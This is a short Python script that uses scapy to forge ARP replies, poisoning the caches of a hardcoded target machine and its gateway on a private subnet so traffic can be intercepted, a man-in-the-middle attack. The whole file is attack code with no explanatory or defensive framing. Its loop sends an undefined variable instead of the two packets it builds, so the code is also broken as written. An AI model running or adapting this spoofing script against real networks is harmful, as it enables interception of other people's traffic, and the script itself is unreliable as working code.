#!/usr/bin/env python

from scapy.all import *
import time

mac_target = "90:1b:0e:8f:7e:bc"
ip_target = "172.29.101.190"
mac_gateway = "00:00:5E:00:01:65"
ip_gateway = "172.29.101.1"


arp_spoof_target = ARP(op="is-at", psrc=ip_gateway, hwdst=mac_target, pdst=ip_target)
arp_spoof_gate = ARP(op="is-at", psrc=ip_target, hwdst=mac_gateway, pdst=ip_gateway)

while True:
    try:
        send(arp_spoof)
        time.sleep(3)
        #  Resend ARP Request after a couple of seconds
    except KeyboardInterrupt:
        break
